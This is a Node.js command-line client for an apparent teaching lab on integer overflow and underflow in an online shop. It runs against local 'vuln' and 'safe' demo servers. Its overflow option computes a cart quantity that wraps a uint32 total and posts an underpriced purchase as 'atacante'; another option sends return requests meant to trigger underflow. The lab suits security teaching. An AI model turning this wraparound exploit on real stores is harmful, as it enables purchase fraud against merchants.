
const inquirer = require("inquirer");
const fetch = require("node-fetch");
const chalk = require("chalk");

// URLs de los servidores
// En Docker Compose, usar nombres de servicio; fuera de Docker, usar localhost
const VULN_URL = process.env.DOCKER_ENV ? "http://vuln-store:3200" : "http://localhost:3200";
const SAFE_URL = process.env.DOCKER_ENV ? "http://safe-store:3201" : "http://localhost:3201";

function uint32Mul(a, b) { return (Math.imul(a >>> 0, b >>> 0) >>> 0); }

async function main() {
  console.log(chalk.cyan.bold("\nDemo: Tienda tecnológica — Integer Overflow & Underflow"));
  while (true) {
    const { accion } = await inquirer.prompt([
      { type: "list", name: "accion", message: "Elige acción", 
        choices: [
          "Ver productos",
          "Exploit automático (overflow)",
          "Simular devolución (underflow)",
          "Salir"
        ] }
    ]);
    if (accion === "Salir") process.exit(0);

    if (accion === "Ver productos") {
      const { servidor } = await inquirer.prompt([
        { type: "list", name: "servidor", message: "¿Qué servidor usar?", 
          choices: ["vuln", "safe"], default: "vuln" }
      ]);
      const url = servidor === "safe" ? SAFE_URL : VULN_URL;
      const r = await fetch(`${url}/productos`);
      console.table(await r.json());
      continue;
    }

    if (accion === "Exploit automático (overflow)") {
      const { servidor, producto } = await inquirer.prompt([
        { type: "list", name: "servidor", message: "¿Qué servidor usar?", 
          choices: ["vuln", "safe"], default: "vuln" },
        { name: "producto", default: "IPHONE" }
      ]);
      const url = servidor === "safe" ? SAFE_URL : VULN_URL;
      const priceRes = await fetch(`${url}/productos`);
      const list = await priceRes.json();
      const prod = list.find(p => p.codigo === producto);
      const price = Number(prod?.precio || 500000);
      const UINT32 = 2 ** 32;
      const cantidad = Math.floor(UINT32 / price) + 1;
      const costoReal = BigInt(cantidad) * BigInt(price);
      const costoEnvuelto = uint32Mul(cantidad >>> 0, price >>> 0);
      console.table({ producto, precio: price, cantidad, costoReal: costoReal.toString(), costoEnvuelto });
      const body = { cliente: "atacante", carrito: [{ producto, cantidad }], pago: costoEnvuelto };
      const r = await fetch(`${url}/comprar`, { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } });
      console.log(await r.json());
      continue;
    }

    if (accion === "Simular devolución (underflow)") {
      const { servidor, producto } = await inquirer.prompt([
        { type: "list", name: "servidor", message: "¿Qué servidor usar?", 
          choices: ["vuln", "safe"], default: "vuln" },
        { name: "producto", default: "IPHONE" }
      ]);
      const { cantidad } = await inquirer.prompt([{ name: "cantidad", message: "¿Cuántas unidades devolver?", default: "10" }]);
      const url = servidor === "safe" ? SAFE_URL : VULN_URL;
      const body = { producto, cantidad: Number(cantidad) };
      const r = await fetch(`${url}/devolver`, { method: "POST", body: JSON.stringify(body), headers: { "Content-Type": "application/json" } });
      console.log(await r.json());
      continue;
    }
  }
}

main().catch(console.error);
